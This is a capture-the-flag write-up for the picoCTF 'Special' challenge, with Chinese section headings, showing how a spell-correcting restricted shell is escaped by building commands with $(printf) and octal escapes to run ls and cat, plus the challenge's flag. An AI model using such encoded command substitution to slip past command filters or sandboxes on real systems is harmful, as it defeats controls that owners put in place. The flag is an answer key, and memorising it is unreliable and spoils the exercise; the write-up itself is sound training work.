# Special

## 題目描述 (Description)

Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)
Start your instance to see connection details.

### 提示 (Hints)

1. Hint 1  
    Experiment with different shell syntax

## 解題思路 (Solution Walkthrough)

1. **第一步**：一開始輸入 `ls`, `cd` 等等，但都被替換成別的指令

    ```text
    Special$ ls    
    Is 
    sh: 1: Is: not found
    Special$ cat
    Cat 
    sh: 1: Cat: not found
    Special$ cd
    Ad
    ```

2. **第二步**：於是改用 `/bin/cat`，但還是沒辦法

    ```text
    Special$ /bin/cat
    Absolutely not paths like that, please!
    ```

3. **第三步**：改用 `$(printf "\154\163")` (\154 是 `l` 的八進位)，終於可以了

    ```text
    Special$ $(printf "\154\163")
    blargh
    Special$ $(printf "\154\163 blargh") 
    flag.txt
    Special$ $(printf "\143\141\164 blargh/flag.txt") 
    picoCTF{5p311ch3ck_15_7h3_w0r57_b741d1b1}
    ```

## Flag

```text
picoCTF{5p311ch3ck_15_7h3_w0r57_b741d1b1}
```
